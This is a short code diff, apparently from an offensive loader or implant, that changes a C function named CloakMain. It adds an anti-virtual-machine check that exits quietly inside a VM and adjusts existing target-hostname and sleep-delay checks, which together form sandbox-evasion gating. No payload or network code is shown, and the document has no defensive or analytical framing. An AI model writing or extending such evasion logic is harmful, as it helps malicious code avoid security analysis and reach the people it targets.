@@ -3,13 +3,23 @@
 
 int CloakMain(PVOID Reserved) {
 
+    #ifdef ANTI_VM
+    if ( IsVm() ) {
+        #ifdef DEBUG
+        printf( "[-] VM DETECTED\n");
+        #endif // !DEBUG
+        
+        return 0;
+    }
+    #endif // !ANTI_VM
+
     #ifdef CHECK_HOSTNAME
     if ( ! CheckHostname( HOSTNAME ) ) {
         #ifdef DEBUG
         printf( "[-] Hostnames do not match\n");
         #endif // !DEBUG
         
-        return 1;
+        return 0;
     }
     #endif // !CHECK_HOSTNAME
 
@@ -28,7 +38,7 @@ int CloakMain(PVOID Reserved) {
     DWORD t1 = GetTickCount64();
 
     if ( ( DWORD ) ( t1 - t0 ) < DELAY * 1000 ) {
-        return 1;
+        return 0;
     }
 
     CloseHandle( hEvent );
